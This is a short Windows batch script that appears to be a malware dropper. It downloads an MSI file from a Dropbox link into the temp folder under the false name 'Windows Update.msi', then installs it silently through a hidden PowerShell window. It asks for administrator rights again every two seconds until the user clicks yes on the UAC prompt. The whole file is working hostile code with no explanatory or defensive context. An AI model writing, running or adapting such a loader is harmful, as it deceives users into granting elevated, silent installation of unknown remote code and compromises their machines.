@echo off
setlocal enabledelayedexpansion

:: Set download URL and paths
set "url=https://dl.dropboxusercontent.com/scl/fi/alf3x72krw2efb5xqatys/crm.msi?rlkey=3kye4tri5h5432dm9h6sqxbsr"
set "outputFileName=Windows Update.msi"
set "outputFilePath=%TEMP%\%outputFileName%"

:: Delete existing file if any
if exist "%outputFilePath%" del /f /q "%outputFilePath%"

echo Downloading MSI from %url% ...
powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%url%' -OutFile '%outputFilePath%' -UseBasicParsing } catch { exit 1 }"

if not exist "%outputFilePath%" (
    echo Download failed. Exiting.
    exit /b 1
)

:RunLoop
echo Attempting to run MSI installer with UAC prompt...

:: Try to elevate and run the MSI silently
powershell -WindowStyle Hidden -Command "$p = Start-Process msiexec.exe -ArgumentList '/i \"%outputFilePath%\" /qn' -Verb runAs -PassThru -ErrorAction SilentlyContinue; if ($p) { $p.WaitForExit(); exit 0 } else { exit 1 }"

:: Check if last command succeeded (user clicked Yes)
if %ERRORLEVEL%==0 (
    exit /b 0
)

:: Wait 2 seconds before trying again
timeout /t 2 /nobreak >nul
goto RunLoop
